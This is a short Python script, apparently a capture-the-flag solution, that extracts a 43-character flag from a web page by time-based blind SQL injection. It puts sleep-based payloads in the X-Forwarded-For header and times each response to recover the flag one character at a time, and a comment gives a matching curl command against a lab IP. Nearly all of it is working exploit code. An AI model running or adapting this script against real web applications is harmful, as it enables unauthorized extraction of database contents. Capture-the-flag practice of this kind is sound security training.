#!/bin/python3

import requests
import time
import string
# create character list A-Z 0-9 {} :
# curl '10.10.26.93' -H "X-Forwarded-For: 127.0.0.1' AND (SELECT sleep(2) from flag where substr(flag.flag,1,1) = 'T') AND '1'='1"


## FYI dictionary is just a string. in a "for" loop, it iterates through its characters by design, just remembered.
ip = "127.0.0.1"
dictionary = string.ascii_uppercase + string.digits + '{' + '}' + ':'

def main():
	host = f"http://{ip}/terms-and-conditions"
	payload_dict = {"X-Forwarded-For": ""}
	flag_index = 1
	final_flag = ""
	while 1:
		for character in dictionary:
			payload_dict["X-Forwarded-For"] = f"X-Forwarded-For: 127.0.0.1' AND (SELECT sleep(2) from flag where substr(flag.flag,{flag_index},1) = '{character}') AND '1'='1"
			tx = time.time()
			request = requests.get(host, headers=payload_dict)
			rx = time.time()
			if rx - tx >= 2:
				final_flag = final_flag + character
				print(final_flag)
				flag_index += 1
		if len(final_flag) == 43:
			print(f"!!!FINISHED!!!\nFinal_flag: {final_flag}")
			break
if __name__ == '__main__':
	main()
